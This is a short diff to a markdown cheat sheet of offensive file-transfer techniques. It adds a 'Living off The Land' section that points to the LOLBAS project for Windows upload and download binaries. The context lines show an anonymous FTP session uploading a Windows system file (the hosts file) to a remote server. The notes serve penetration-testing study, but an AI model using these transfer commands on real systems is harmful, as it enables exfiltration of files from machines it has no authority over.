@@ -10,6 +10,7 @@
   - [PowerShell SMB Uploads](#3-powershell-smb-uploads)
   - [PowerShell FTP Uploads](#4-powershell-ftp-uploads)
 
+- [Living off The Land](#living-off-the-land)
 
 # Download Operations
 
@@ -208,3 +209,7 @@ ftp> USER anonymous
 ftp> PUT c:\windows\system32\drivers\etc\hosts
 ftp> bye
 ```
+
+
+# Living off The Land
+check in [LOLBAS Project for Windows Binaries](https://lolbas-project.github.io/#) and search for upload and download
